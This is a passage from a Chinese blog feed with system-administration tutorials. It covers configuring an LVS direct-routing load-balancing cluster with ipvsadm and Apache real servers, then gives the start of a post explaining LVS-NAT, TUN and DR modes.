  &#x76EE;&#x6807;MAC&#xFF1A;VMAC<br>4&#xFF09;&#x62A5;&#x6587;&#x5230;&#x8FBE;director&#x4E4B;&#x540E;&#xFF0C;&#x89E3;&#x5305;&#xFF0C;&#x53D1;&#x73B0;&#x76EE;&#x6807;MAC&#x662F;&#x81EA;&#x5DF1;&#xFF0C;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;<br>    &#x5904;&#x7406;&#x5B8C;&#x6210;&#xFF0C;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x4E00;&#x4E2A;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#xFF0C;&#x8F6C;&#x53D1;&#x62A5;&#x6587;&#x5230;&#x8FBE;&#x5176;&#x4E2D;&#x4E00;&#x53F0;RS&#x4E0A;<br>    &#x6E90;&#x5730;&#x5740;&#xFF1A;CIP    &#x76EE;&#x6807;&#x5730;&#x5740;&#xFF1A;VIP<br>    &#x6E90;MAC&#xFF1A;DMAC    &#x76EE;&#x6807;MAC&#xFF1A;RMAC<br>5&#xFF09;&#x6570;&#x636E;&#x62A5;&#x6587;&#x5230;&#x8FBE;RS&#x4E4B;&#x540E;&#xFF0C;&#x8FDB;&#x884C;&#x8282;&#x5C01;&#x88C5;, &#x53D1;&#x73B0;&#x76EE;&#x6807;mac&#x662F;&#x81EA;&#x5DF1;, &#x5F00;&#x59CB;&#x89E3;&#x6790;, &#x53D1;&#x73B0;VIP&#x4E5F;&#x6709;,&#x5F00;&#x59CB;&#x5904;&#x7406;<br>6), &#x5904;&#x7406;&#x5B8C;&#x6210;&#x4E4B;&#x540E;, &#x6570;&#x636E;&#x76F4;&#x63A5;&#x901A;&#x8FC7;RS&#x6D41;&#x5411;&#x5BA2;&#x6237;&#x7AEF;</p><h2 id="&#x4F7F;&#x7528;LVS-DR&#x642D;&#x5EFA;&#x96C6;&#x7FA4;"><a href="#&#x4F7F;&#x7528;LVS-DR&#x642D;&#x5EFA;&#x96C6;&#x7FA4;" class="headerlink" title="&#x4F7F;&#x7528;LVS-DR&#x642D;&#x5EFA;&#x96C6;&#x7FA4;"></a>&#x4F7F;&#x7528;LVS-DR&#x642D;&#x5EFA;&#x96C6;&#x7FA4;</h2><p>Director<br>DIP<code>192.68.110.13</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code></p><p>RS1<br>RIP<code>192.168.110.11</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code></p><p>RS2<br>RIP<code>192.168.110.12</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code></p><p><strong>&#x914D;&#x7F6E;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5206;&#x53D1;&#x5668;</strong>  </p><pre><code># &#x914D;&#x7F6E;VIPifconfig ens33:1 192.168.110.10&#x914D;&#x7F6E;&#x7F51;&#x5173;route del default gw x.x.x.xroute add default gw 192.168.110.10 dev ens33# &#x914D;&#x7F6E;LVS/DRipvsadm --clear[root@server13 ~]# ipvsadm -A -t 192.168.110.10:80 -s rr[root@server13 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConnTCP  192.168.110.10:80 rr[root@server13 ~]# ipvsadm -a -t 192.168.110.10:80 -r 192.168.110.11 -g[root@server13 ~]# ipvsadm -a -t 192.168.110.10:80 -r 192.168.110.12 -g[root@server13 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConnTCP  192.168.110.10:80 rr  -&gt; 192.168.110.11:80            Route   1      0          0  -&gt; 192.168.110.12:80            Route   1      0          0[root@server13 ~]## -g DR&#x6A21;&#x5F0F;# -m IPTun&#x6A21;&#x5F0F;</code></pre><p><strong>&#x914D;&#x7F6E;Real Server</strong>  </p><pre><code class="shell">ifconfig ens33:1 192.168.110.10route del default gw x.x.x.xroute add default gw 192.168.110.1 dev ens33ip_addr=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`yum install -y httpdecho $ip_addr &gt; /var/www/html/index.htmlsystemctl start httpdecho 1 &gt; /proc/sys/net/ipv4/conf/ens33/arp_ignoreecho 2 &gt; /proc/sys/net/ipv4/conf/ens33/arp_announce</code></pre><pre><code class="shell">ifconfig lo:1 192.168.110.10 netmask 255.255.255.255route del default gw xx.x.x.xroute add default gw 192.168.110.1 dev ens33ip_addr=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`yum install -y httpdecho $ip_addr &gt; /var/www/html/index.htmlsystemctl start httpdecho 1 &gt; /proc/sys/net/ipv4/conf/ens33/arp_ignoreecho 2 &gt; /proc/sys/net/ipv4/conf/ens33/arp_announce</code></pre><p><strong>&#x5728;RS1&#x4E0A;&#x8BBF;&#x95EE;</strong></p><pre><code>[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]# curl 192.168.110.10192.168.110.11[root@server11 ~]#</code></pre><p><strong>&#x5728;RS2&#x4E0A;&#x8BBF;&#x95EE;</strong></p><pre><code>[root@server12 ~]# curl 192.168.110.10192.168.110.12[root@server12 ~]# curl 192.168.110.10192.168.110.12[root@server12 ~]# curl 192.168.110.10192.168.110.12[root@server12 ~]# curl 192.168.110.10192.168.110.12[root@server12 ~]# curl 192.168.110.10192.168.110.12[root@server12 ~]# curl 192.168.110.10192.168.110.12[root@server12 ~]#</code></pre><p><strong>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;</strong></p><pre><code>[root@repo_srv ~]# curl 192.168.110.10192.168.110.11[root@repo_srv ~]# curl 192.168.110.10192.168.110.12[root@repo_srv ~]# curl 192.168.110.10192.168.110.11[root@repo_srv ~]# curl 192.168.110.10192.168.110.12[root@repo_srv ~]# curl 192.168.110.10192.168.110.11[root@repo_srv ~]# curl 192.168.110.10192.168.110.12[root@repo_srv ~]#</code></pre><h2 id="&#x6269;&#x5C55;&#xFF1A;Shell&#x811A;&#x672C;"><a href="#&#x6269;&#x5C55;&#xFF1A;Shell&#x811A;&#x672C;" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A;Shell&#x811A;&#x672C;"></a>&#x6269;&#x5C55;&#xFF1A;Shell&#x811A;&#x672C;</h2><p><strong>Director</strong><br>DIP<code>192.168.110.15</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code></p><p><strong>RS1</strong><br>RIP<code>192.168.110.11</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code>  </p><p><strong>RS2</strong><br>RIP<code>192.168.110.12</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code>  </p><p><strong>Director</strong>  </p><pre><code class="shell">#!/bin/bash# Configure network/usr/sbin/ifconfig ens33 192.168.110.15 netmask 255.255.255.0/usr/sbin/ifconfig ens33:1 192.168.110.10 /usr/sbin/route add default gw 192.168.110.1 dev ens33:1/etc/init.d/network restart# Config LVSyum install -y ipvsadmipvsadm --clearipvsadm -A -t 192.168.110.10:80 -s rripvsadm -a -t 192.168.110.10:80 -r 192.168.110.11 -gipvsadm -a -t 192.168.110.10:80 -r 192.168.110.12 -g# -g DR&#x6A21;&#x5F0F;# -m IPTUN&#x6A21;&#x5F0F;ipvsadm -L -n</code></pre><p><strong>Real Server</strong>  </p><pre><code class="shell">#!/bin/bashifconfig lo:192.168.110.10 netmask 255.255.255.255sed -i &apos;s/GATEWAY=*.*.*.*/GATEWAY=192.168.110.1/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33/etc/init.d/network restartyum install -y httpd &amp;&gt; /dev/nullip_addr=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`echo &quot;$ip_addr&quot; &gt; /var/www/html/index.htmlsystemctl restart httpd# Disable ARP forwardifconfig ens33 -arp# Permanent ways:#echo 1 &gt; /proc/sys/net/ipv4/conf/ens33/arp_ignore#echo 2 &gt; /proc/sys/net/ipv4/conf/ens33/apr_announce##############################################33333#echo &quot;net.ipv4.conf.ens33.arp_ignore = 1&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.ens33.arp_announce = 2&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.all.arp_ignore = 1&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.all.arp_announce = 2&quot; &gt;&gt; /etc/sysctl.conf #echo &quot;net.ipv4.conf.lo.arp_ignore = 1&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.lo.arp_announce = 2&quot; &gt;&gt; /etc/sysctl.conf# Enable ARP forward#ifconfig ens33 arp</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;LVS&amp;#x76F8;&amp;#x5173;&quot;&gt;&lt;a href=&quot;#LVS&amp;#x76F8;&amp;#x5173;&quot; class=&quot;headerlink&quot; title=&quot;LVS&amp;#x76F8;&amp;#x5173;&quot;&gt;&lt;/a&gt;LVS&amp;#x76F8;&amp;#x5173;&lt;/h2&gt;&lt;p&gt;&lt;s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS-NAT集群</title>
    <link href="https://marnm.github.io//posts/dcf8e277/"/>
    <id>https://marnm.github.io//posts/dcf8e277/</id>
    <published>2022-06-07T05:34:48.000Z</published>
    <updated>2022-09-02T19:23:13.179Z</updated>
    
    <content type="html"><![CDATA[<p><strong>LVS&#x76F8;&#x5173;</strong></p><p>LVS&#x662F;Linux Virtual Server&#x7684;&#x7B80;&#x5199;&#xFF0C;&#x610F;&#x5373;Linux&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x865A;&#x62DF;&#x7684;&#x670D;&#x52A1;&#x5668;&#x96C6;&#x7FA4;&#x7CFB;&#x7EDF;&#x3002;&#x672C;&#x9879;&#x76EE;&#x5728;1998&#x5E74;5&#x6708;&#x7531;&#x7AE0;&#x6587;&#x5D69;&#x535A;&#x58EB;&#x6210;&#x7ACB;&#xFF0C;&#x662F;&#x4E2D;&#x56FD;&#x56FD;&#x5185;&#x6700;&#x65E9;&#x51FA;&#x73B0;&#x7684;&#x81EA;&#x7531;&#x8F6F;&#x4EF6;&#x9879;&#x76EE;&#x4E4B;&#x4E00;&#x3002;</p><p>&#x53EF;&#x4F38;&#x7F29;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x51E0;&#x79CD;&#x7ED3;&#x6784;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x524D;&#x7AEF;&#x7684;&#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x5668;&#xFF08;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x8FDB;&#x884C;&#x4E3B;&#x4ECE;&#x5907;&#x4EFD;&#xFF09;&#x3002;&#x6211;&#x4EEC;&#x5148;&#x5206;&#x6790;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#xFF0C;&#x6307;&#x51FA;IP&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x6280;&#x672F;&#x662F;&#x5728;&#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x5668;&#x7684;&#x5B9E;&#x73B0;&#x6280;&#x672F;&#x4E2D;&#x6548;&#x7387;&#x6700;&#x9AD8;&#x7684;&#x3002;&#x5728;&#x5DF2;&#x6709;&#x7684;IP&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x6280;&#x672F;&#x4E2D;&#xFF0C;&#x4E3B;&#x8981;&#x6709;<strong>&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#xFF08;Network Address Translation&#xFF09;&#x5C06;&#x4E00;&#x7EC4;&#x670D;&#x52A1;&#x5668;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x3001;&#x9AD8;&#x53EF;&#x7528;&#x7684;&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;</strong>&#xFF0C;&#x6211;&#x4EEC;&#x79F0;&#x4E4B;&#x4E3A;<code>VS/NAT</code>&#x6280;&#x672F;&#xFF08;Virtual Server via Network Address Translation&#xFF09;&#x3002;&#x5728;&#x5206;&#x6790;VS/NAT&#x7684;&#x7F3A;&#x70B9;&#x548C;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x6027;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x6211;&#x4EEC;&#x63D0;&#x51FA;&#x4E86;<strong>&#x901A;&#x8FC7;IP&#x96A7;&#x9053;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65B9;&#x6CD5;VS/TUN&#xFF08;Virtual Server via IP Tunneling&#xFF09;</strong>&#xFF0C;&#x548C;<strong>&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x8DEF;&#x7531;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65B9;&#x6CD5;VS/DR&#xFF08;Virtual Server via Direct Routing&#xFF09;</strong>&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x7684;&#x4F38;&#x7F29;&#x6027;&#x3002;VS/NAT&#x3001;VS/TUN&#x548C;VS/DR&#x6280;&#x672F;&#x662F;LVS&#x96C6;&#x7FA4;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#x4E09;&#x79CD;IP&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x6280;&#x672F;&#x3002;</p><p>LVS&#x9879;&#x76EE;&#x5B98;&#x65B9;(<a href="http://www.linuxvirtualserver.org/" target="_blank" rel="noopener">http://www.linuxvirtualserver.org/</a>)<br>&#x4E2D;&#x6587;&#xFF1A;<a href="http://zh.linuxvirtualserver.org/" target="_blank" rel="noopener">http://zh.linuxvirtualserver.org/</a></p><p><strong>&#x96C6;&#x7FA4;&#x76F8;&#x5173;</strong>  </p><blockquote><p>&#x4E00;&#x7EC4;&#x5404;&#x81EA;&#x76F8;&#x4E92;&#x72EC;&#x7ACB;&#x4E14;&#x53C8;&#x76F8;&#x4E92;&#x4F9D;&#x8D56;&#x7684;&#xFF0C;&#x901A;&#x8FC7;&#x544A;&#x8BC9;&#x7F51;&#x7EDC;&#x4E92;&#x8054;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210;&#x7684;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#xFF0C;&#x4EE5;&#x5355;&#x4E00;&#x7684;&#x7CFB;&#x7EDF;&#x6A21;&#x5F0F;&#x52A0;&#x4EE5;&#x7BA1;&#x7406;&#xFF0C;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x3002;</p></blockquote><p>&#x96C6;&#x7FA4;&#x7684;&#x7279;&#x6027;&#xFF1A;&#x53EF;&#x4F38;&#x7F29;&#x6027;, &#x53EF;&#x9760;&#x6027;,  &#x53EF;&#x7BA1;&#x7406;&#x6027;</p><p><strong>&#x5E94;&#x7528;&#x573A;&#x666F;</strong><br>&#x4F8B;&#xFF1A;<br>&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x5982;&#x679C;&#x80FD;&#x591F;&#x54CD;&#x5E94;10000&#x4E2A;&#x5E76;&#x53D1;&#x8FD4;&#x56DE;&#x7684;&#x72B6;&#x6001;&#x7801;&#x5168;&#x90E8;&#x662F;200<br>&#x5982;&#x679C;&#x73B0;&#x5728;&#x6709;20000&#x4E2A;&#x5E76;&#x53D1;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x72B6;&#x6001;&#x7801;[<code>200</code>  <code>304</code>   <code>301</code>   <code>500</code>   <code>404</code>]<br>&#x7531;&#x4EE5;&#x4E0A;&#x4F8B;&#x5B50;&#x8BF4;&#x660E;&#xFF0C;web&#x670D;&#x52A1;&#x5DF2;&#x7ECF;&#x8FBE;&#x5230;&#x74F6;&#x9888;  </p><p>&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x529E;&#x6CD5;:<br>    &#x52A0;&#x914D;&#x7F6E;: &#x52A0;CPU, &#x52A0;&#x5185;&#x5B58;, &#x52A0;&#x5E26;&#x5BBD;, &#x52A0;SSD &#x8FD9;&#x79CD;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x79F0;&#x4E3A;<strong>&#x201C;&#x5411;&#x4E0A;&#x6269;&#x5C55;&#x201D;</strong> , &#x80FD;&#x591F;&#x89E3;&#x51B3;&#x4E00;&#x65F6;, &#x5374;&#x4E0D;&#x80FD;&#x6301;&#x4E45;&#x4E00;&#x4E16;[&#x5355;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x505A;&#x52A8;&#x4F5C;]<br>    &#x52A0;&#x670D;&#x52A1;&#x5668;: &#x4E00;&#x53F0;==&gt;&#x4E24;&#x53F0;, &#x4E24;&#x53F0;==&gt;&#x56DB;&#x53F0;  &#x56DB;&#x53F0;==&gt;8&#x53F0;  &#x4F7F;&#x7528;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#xFF0C;&#x800C;&#x8FD9;&#x4E00;&#x79CD;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x5219;&#x79F0;&#x4E3A; <strong>&#x201C;&#x6A2A;&#x5411;&#x6269;&#x5C55;&#x201D;&#x6216;&#x201C;&#x5411;&#x5916;&#x6269;&#x5C55;&#x201D;<br>    &#x5411;&#x5916;&#x6269;&#x5C55;: &#x5C31;&#x662F;&#x96C6;&#x7FA4;</strong></p><p><strong>&#x96C6;&#x7FA4;&#x7684;&#x79CD;&#x7C7B;</strong><br>&#x96C6;&#x7FA4;&#x7CFB;&#x7EDF;&#x4E3B;&#x8981;&#x5206;&#x4E3A;</p><ul><li>&#x8D1F;&#x8F7D;&#x5747;&#x8861;(Load Balance)&#x96C6;&#x7FA4;&#xFF0C;&#x7B80;&#x79F0; LB</li><li>&#x9AD8;&#x53EF;&#x7528;(High Availability)&#x96C6;&#x7FA4;&#xFF0C;&#x7B80;&#x79F0; HA &#x96C6;&#x7FA4;</li><li><p>&#x9AD8;&#x6027;&#x80FD;&#x8BA1;&#x7B97;(High Perfermance Computing)&#x96C6;&#x7FA4;&#xFF0C;&#x7B80;&#x79F0; HPC &#x96C6;&#x7FA4;</p><p><strong>LB&#x5B9E;&#x73B0;&#x624B;&#x6BB5;</strong><br>&#x786C;&#x4EF6;&#x7684;&#x5B9E;&#x73B0;&#xFF1A;  &#x2013; F5 &#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;<br>&#x8F6F;&#x4EF6;&#x7684;&#x5B9E;&#x73B0;&#xFF1A;  &#x2013; LVS(4&#x5C42;&#xFF0C;&#x4F20;&#x8F93;&#x5C42;)  &#x2013; Nginx(7&#x5C42;&#xFF0C;&#x5E94;&#x7528;&#x5C42;)</p></li></ul><p><strong>&#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x5668;&#x5206;&#x53D1;&#x5668;</strong>&#xFF1A;(Load Balancer, Director): &#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x5BF9;&#x5916;&#x7684;&#x6700;&#x524D;&#x7AEF;&#x673A;, &#x8D1F;&#x8D23;&#x63A5;&#x6536;&#x7528;&#x6237;&#x8BF7;&#x6C42;, &#x5E76;&#x4E14;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;, &#x5C06;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x540E;&#x7AEF;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x52A8;&#x4F5C;&#xFF0C;&#x800C;&#x5BA2;&#x6237;&#x8BA4;&#x4E3A;&#x670D;&#x52A1;&#x662F;&#x6765;&#x81EA;&#x4E00;&#x4E2A;IP&#x5730;&#x5740;&#xFF08;&#x6211;&#x4EEC;&#x53EF;&#x79F0;&#x4E4B;&#x4E3A;VIP(&#x865A;&#x62DF;IP&#x5730;&#x5740;)&#xFF09;&#x4E0A;&#x7684;&#x3002;</p><p><strong>&#x670D;&#x52A1;&#x5668;&#x6C60;</strong>: Server Pool  &#x771F;&#x6B63;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x670D;&#x52A1;&#x5668;, &#x6BCF;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x5C31;&#x662F;&#x4E00;&#x53F0;RS[Real Server]&#xFF0C;&#x6267;&#x884C;&#x7684;&#x670D;&#x52A1;&#x6709;WEB&#x3001;MAIL&#x3001;FTP&#x548C;DNS&#x7B49;&#x3002;</p><p><strong>&#x5171;&#x4EAB;&#x5B58;&#x50A8;</strong>: Shared Storaged &#x4E3A;RS&#x4FDD;&#x6301;&#x76F8;&#x540C;&#x5185;&#x5BB9;, &#x63D0;&#x4F9B;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5B83;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#x6C60;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x5171;&#x4EAB;&#x7684;&#x5B58;&#x50A8;&#x533A;&#xFF0C;&#x8FD9;&#x6837;&#x5F88;&#x5BB9;&#x6613;&#x4F7F;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x6C60;&#x62E5;&#x6709;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x63D0;&#x4F9B;&#x76F8;&#x540C;&#x7684;&#x670D;&#x52A1;&#x3002;</p><h2 id="LVS&#x6A21;&#x5F0F;&#x53CA;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"><a href="#LVS&#x6A21;&#x5F0F;&#x53CA;&#x5DE5;&#x4F5C;&#x539F;&#x7406;" class="headerlink" title="LVS&#x6A21;&#x5F0F;&#x53CA;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"></a>LVS&#x6A21;&#x5F0F;&#x53CA;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h2><h3 id="LVS&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E09;&#x79CD;&#x5305;&#x8F6C;&#x53D1;&#x65B9;&#x5F0F;"><a href="#LVS&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E09;&#x79CD;&#x5305;&#x8F6C;&#x53D1;&#x65B9;&#x5F0F;" class="headerlink" title="LVS&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E09;&#x79CD;&#x5305;&#x8F6C;&#x53D1;&#x65B9;&#x5F0F;"></a>LVS&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E09;&#x79CD;&#x5305;&#x8F6C;&#x53D1;&#x65B9;&#x5F0F;</h3><p>LVS&#x63D0;&#x4F9B;&#x4E86;&#x4E09;&#x79CD;&#x5305;&#x8F6C;&#x53D1;&#x65B9;&#x5F0F;&#xFF1A;NAT(&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x6620;&#x5C04;)&#x3001;IP Tunneling(IP&#x96A7;&#x9053;)&#x3001;Direct Routing(&#x76F4;&#x63A5;&#x8DEF;&#x7531;)&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x8F6C;&#x53D1;&#x6A21;&#x5F0F;&#x51B3;&#x5B9A;&#x4E86;&#x4E0D;&#x540C;&#x7684;cluster&#x7684;&#x7F51;&#x7EDC;&#x7ED3;&#x6784;</p><p><strong>NAT(&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x6620;&#x5C04;)</strong></p><table><thead><tr><th>NAT: &#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;</th><th></th></tr></thead><tbody><tr><td>DNAT: &#x76EE;&#x6807;&#x5730;&#x5740;&#x8F6C;&#x6362;</td><td>&#x6539;&#x53D8;&#x7684;&#x662F;&#x76EE;&#x6807;&#x5730;&#x5740;</td></tr><tr><td>SNAT: &#x6E90;&#x5730;&#x5740;&#x8F6C;&#x6362;</td><td>&#x6539;&#x53D8;&#x7684;&#x662F;&#x6E90;&#x5730;&#x5740;</td></tr><tr><td>LVS-NAT</td><td>&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x7684;SNAT&#x548C;DNAT &#x5B8C;&#x6210;&#x62A5;&#x7684;&#x8F6C;&#x53D1;</td></tr></tbody></table><p><strong>NAT&#x65B9;&#x5F0F;&#x53EF;&#x652F;&#x6301;&#x4EFB;&#x4F55;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x4EE5;&#x53CA;&#x79C1;&#x6709;&#x7F51;&#x7EDC;&#xFF0C;&#x5E76;&#x4E14;&#x53EA;&#x9700;&#x4E00;&#x4E2A;Internet IP&#x5730;&#x5740;</strong>&#xFF0C;&#x4F46;&#x662F;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#x53D7;&#x5230;&#x9650;&#x5236;&#x3002;&#x56E0;&#x4E3A;&#x6267;&#x884C;NAT&#x6BCF;&#x6B21;&#x9700;&#x8981;&#x91CD;&#x5199;&#x5305;&#xFF0C;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5EF6;&#x8FDF;&#xFF1B;&#x53E6;&#x5916;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x5E94;&#x7528;&#x6709;80%&#x7684;&#x6570;&#x636E;&#x662F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x6D41;&#x5411;&#x5BA2;&#x6237;&#x673A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x975E;&#x5E38;&#x77ED;&#xFF0C;&#x800C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x56DE;&#x5E94;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x5BF9;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x5F62;&#x6210;&#x5F88;&#x5927;&#x538B;&#x529B;&#xFF0C;&#x6210;&#x4E3A;&#x4E86;&#x65B0;&#x7684;&#x74F6;&#x9888;&#x3002;</p><p><strong>IP Tunneling(IP&#x96A7;&#x9053;)</strong><br>director&#xFF08;&#x5206;&#x53D1;&#x5668;&#xFF09;&#x5206;&#x914D;&#x8BF7;&#x6C42;&#x5230;&#x4E0D;&#x540C;&#x7684;real server&#xFF1B;real server&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x540E;&#x76F4;&#x63A5;&#x56DE;&#x5E94;&#x7ED9;&#x7528;&#x6237;&#xFF0C;&#x8FD9;&#x6837;director&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x4EC5;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x673A;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E00;&#x534A;&#x8FDE;&#x63A5;&#x3002;IP Tunneling&#x6280;&#x672F;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;director&#x7684;&#x8C03;&#x5EA6;&#x5904;&#x7406;&#x80FD;&#x529B;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x7CFB;&#x7EDF;&#x80FD;&#x5BB9;&#x7EB3;&#x7684;&#x6700;&#x5927;&#x8282;&#x70B9;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x8D85;&#x8FC7;100&#x4E2A;&#x8282;&#x70B9;&#x3002;real 